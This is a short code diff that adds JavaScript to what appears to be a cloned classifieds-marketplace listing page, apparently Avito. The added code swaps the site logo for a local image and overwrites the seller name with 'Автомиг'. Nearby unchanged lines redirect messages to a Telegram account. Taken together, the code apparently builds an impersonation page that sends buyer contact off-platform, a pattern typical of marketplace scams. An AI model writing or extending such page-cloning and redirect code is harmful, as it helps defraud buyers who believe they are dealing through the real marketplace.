@@ -329,6 +329,23 @@ js_code = """<!-- Supabase JS -->
                 link.innerHTML = '';
             });
 
+            // 12. Replace search form logo
+            const searchLogo = document.querySelector('[data-marker="search-form/logo"]');
+            if (searchLogo) {
+                searchLogo.style.backgroundImage = 'url("logo.jpg")';
+                searchLogo.style.backgroundSize = 'contain';
+                searchLogo.style.backgroundRepeat = 'no-repeat';
+                searchLogo.style.backgroundPosition = 'center';
+                const svg = searchLogo.querySelector('svg');
+                if (svg) svg.style.visibility = 'hidden';
+            }
+
+            // 13. Replace seller name
+            const sellerName = document.querySelector('[data-marker="seller-info/name"]');
+            if (sellerName) {
+                sellerName.textContent = 'Автомиг';
+            }
+
             
             // 12. Telegram redirect for messages
             const tgUsername = 'Automigsup';
